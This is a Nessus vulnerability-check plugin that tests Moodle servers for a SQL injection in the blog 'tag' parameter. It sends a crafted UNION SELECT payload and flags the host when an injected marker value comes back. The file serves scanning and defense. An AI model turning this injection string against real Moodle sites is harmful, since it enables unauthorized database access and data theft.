#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22527);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(20395);

  script_name(english:"Moodle tag Parameter SQL Injection Vulnerability");
  script_summary(english:"Checks for a SQL injection flaw in Moodle Blog feature");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is susceptible
to a SQL injection attack. 

Description :

The installed version of Moodle fails to properly sanitize
user-supplied input to the 'tag' parameter of the 'blog/index.php'
script before using it in database queries.  Provided the blog feature
is enabled, an unauthenticated attacker may be able to leverage this
issue to manipulate database queries to reveal sensitive information,
modify data, launch attacks against the underlying database, etc. 

See also :

http://archives.neohapsis.com/archives/fulldisclosure/2006-10/0130.html
http://archives.neohapsis.com/archives/fulldisclosure/2006-10/0138.html

Solution :

Apply the patch from CVS or restrict access to the blog feature. 

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:H/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc);

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("moodle_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/moodle"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw.
  username = rand();
  password = unixtime();
  email = rand();
  exploit = string(
    "%27 UNION SELECT %27-1 UNION SELECT 1,1,1,1,1,1,1,", username, ",", password, ",1,1,1,1,1,1,1,", username, ",", password, ",", email, " UNION SELECT 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 FROM mdl_post p, mdl_blog_tag_instance bt, mdl_user u WHERE 1=0%27,1,1,%271"
  );

  req = http_get(
    item:string(
      dir, "/blog/index.php?",
      "tag=x", urlencode(str:exploit)
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (string('<div class="audience"></div><p>', password, '</p>') >< res)
    security_warning(port);
}
